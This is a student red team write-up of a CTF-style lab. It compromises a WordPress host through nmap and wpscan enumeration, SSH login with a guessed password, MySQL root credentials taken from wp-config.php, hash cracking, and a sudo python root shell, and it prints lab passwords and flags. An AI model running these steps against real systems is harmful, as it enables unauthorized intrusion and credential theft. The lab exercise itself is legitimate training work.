# Red Team: Summary of Operations

## Table of Contents
- [Exposed Services](https://github.com/GarinJTanner/Final-Project/blob/main/Red-Team.md#exposed-services)
- [Critical Vulnerabilities](https://github.com/GarinJTanner/Final-Project/blob/main/Red-Team.md#critical-vulnerabilities)
- [Exploitation](https://github.com/GarinJTanner/Final-Project/blob/main/Red-Team.md#exploitation)

## Exposed Services
Nmap scan results for 192.168.1.110 machine reveal the below services and OS details:  
~~~
nmap -sV 192.168.1.110  
~~~

![red111](https://user-images.githubusercontent.com/32025331/155897831-3ed2d82f-ea06-4b2b-88a5-ca45a22de921.PNG)   

This scan identifies the services below as potential points of entry:  
  
- OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)  
- Apache httpd 2.4.10 ((Debian))  

## Critical Vulnerabilities

The following vulnerabilities were identified:

CWE-521 - Weak server password
- Server does not require strong user passwords, making it vulnerable to brute force attacks. 
- Severity: High

CWE-916 - Unsalted hashed passwords
- Hashed passwords that are unsalted can be easily cracked using free softare like john the ripper.
- Severity - Medium  


Unpatched WordPress software (Version 4.8.18)
- CWE-79
- 
 ## Exploitation
The Red Team was able to penetrate Target 1 and retrieve the following confidential data:


### flag1{b9bbcb33e11b80be759c4e844862482d}
Tools used: dirb, wpscan  
- Using dirb we were able to find a wordpress page: 192.168.1.110/wordpress  

![red10](https://user-images.githubusercontent.com/32025331/155897106-083e1297-c5d6-490f-af59-1ac251500554.PNG)


- From there we ran wpscan: 
~~~
wpscan -–url http://192.168.1.110/wordpress --wp-content-dir -at -eu
~~~
![red13](https://user-images.githubusercontent.com/32025331/155897592-cb46a654-efc7-48f6-a220-833e3841df88.PNG)  

We then found two login names: Steven and Michael  
![red14](https://user-images.githubusercontent.com/32025331/155897593-ce8c5a5b-778a-486d-9d9d-c38249113aa4.PNG)  

By sheer luck, we guessed the password without brute force:  
~~~
ssh michael@192.168.1.110
Password: michael
cd ../../var/www/html
grep -RE flag1
~~~
![red222](https://user-images.githubusercontent.com/32025331/155898152-706f9b4c-607d-4a1a-83f1-742a2217463d.PNG)  
  
  
**flag2{fc3fd58dcdad9ab23faca6e9a36e581c}**  
Using the same credentials, we SSH into the webserver:
~~~ 
ssh michael@192.168.1.110
Password: michael
cd ../../var/www/
grep -RE flag2
~~~
![red15](https://user-images.githubusercontent.com/32025331/155897666-7187d4ef-e7dc-4231-985f-f4c87a644dfa.PNG)


**flag3{afc01ab56b50591e7dccf93122770cd2}**  
**flag4{715dea6c055b9fe3337544932f2941ce}**  
Tools used: SSH, MySQL  
~~~
ssh michael@192.168.1.110
Password: michael
cd /var/www/html/wordpress
nano wp-config.php  
~~~

![red444](https://user-images.githubusercontent.com/32025331/155898231-ca6b815e-0a07-46dd-a844-b6eaf18d26cb.PNG)  
Within wp-config.php we were able to find credentials to a MySQL database.
~~~
mysql -u root -pR@v3nSecurity
show databases;
use wordpress;
show tables;
select post_content from wp_posts;
~~~
![red443](https://user-images.githubusercontent.com/32025331/155898281-266c6765-2025-49e4-96d2-a7b4f359dbd8.PNG)  
  
**Flag 4 from Steven’s account**  
- Tools used: SSH, MySQL, johntheripper  
- Using the MySQL credentials from before:  
~~~
mysql -u root -pR@v3nSecurity
show databases;
use wordpress;
show tables;
select user_login, user_pass from wp_users;
~~~  
![red555](https://user-images.githubusercontent.com/32025331/155898316-716315ab-4684-4dbe-bbad-8c096ebbd92a.PNG)  
We found the hashed passwords within the wp_users table.  
Exit back out to Kali. From here we can use John the Ripper:  

SSH into the webserver using Steven’s credentials:  
~~~
Ssh steven@192.168.1.110
Password: pink84
~~~
Now we run a python exploit:
~~~
sudo /usr/bin/python -c 'import os;os.system("/bin/sh")'
cd root
cat flag4.txt
~~~
[picture]
